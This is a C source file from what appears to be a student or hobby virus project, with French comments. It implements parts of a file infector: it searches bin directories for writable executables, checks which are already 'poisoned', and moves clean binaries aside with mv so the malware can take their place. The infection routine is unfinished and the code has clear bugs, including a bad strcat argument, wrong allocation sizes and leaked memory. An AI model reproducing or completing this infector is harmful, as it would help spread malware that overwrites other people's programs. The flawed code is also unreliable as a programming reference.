
#include "malwareUtils.h"
#include "malwareBuilder.h"
#include <unistd.h>

/**
 * @return Execute la command puis renvoie un char* contenant le rÃ©sultat
*/
void getAllFile_exec(char* command,MalwareBuilder *malware) {
    
    char buffer[1024];
    FILE* pipe = popen(command, "r");
    char *result = malloc(sizeof(pipe));

    if (pipe == NULL) {
        printf("Failed to run command\n");
        return;
    }
    while (fgets(buffer, sizeof(buffer), pipe) != NULL) {

        // Remove trailing newline
        buffer[strcspn(buffer, "\n")] = 0;

        printf("%s\n", buffer);
        isInfected(buffer,malware->defaultExtensionName);

    }


    pclose(pipe);
}


int infect_prog(char *path, char *malware_extension){

    // move le fichier sains vers une extension .old
    char *cmd_move = malloc(strlen(path) + strlen(malware_extension) +  3);
    strcpy(cmd_move, "mv ");
    strcat(cmd_move, path);
    strcat(cmd_move, " ");
    strcat(cmd_move, *malware_extension);
    system(cmd_move);
    free(cmd_move);

    // copie le malware dans le fichier sains
    char *cmd_copy = malloc(strlen(path) + strlen(malware_extension) +  3);
    
    return 0;
}


int isInfected(char *path,char *malware_extension){


    char *malware_path = malloc(strlen(path) + strlen(malware_extension) +  1);
    strcpy(malware_path, path);
    strcat(malware_path,malware_extension);

    printf("malware_path: %s\n",malware_path);

    if (access(path, F_OK) == 0) {
        printf("File does exist %s\n",path);
        if (access(malware_path, F_OK) == 0) {
            printf("Virus already exist sleeping... %s\n",malware_path);
        }
        else{
            printf("Virus does not exist poisoning... %s\n",malware_path);
        }
        
        return 0;
    } 
    else {
        printf("File does not exist poisoning... %s\n",path);

        return 1;}
    }




char *getUserWorldWritableFiles(MalwareBuilder *malware){

    char *str1 = "find ";
    char *str2 = " -path '*/bin/*' -executable -writable -type f -exec ls -l {} \\; 2>/dev/null | cut -d ' ' -f9-";
    char *full_cmd = malloc(strlen(str1) + strlen(malware->defaultRepository) + strlen(str2) + 1);


    strcpy(full_cmd, str1);
    strcat(full_cmd, malware->defaultRepository);
    strcat(full_cmd, str2);



    printf("command: %s\n",full_cmd);
    getAllFile_exec(full_cmd,malware);
    free(full_cmd);



    return "result";
}



char *getUserCurentDir(){
    char *buf;
    buf=(char *)malloc(100*sizeof(char));
    getcwd(buf,100);
    return buf;
}





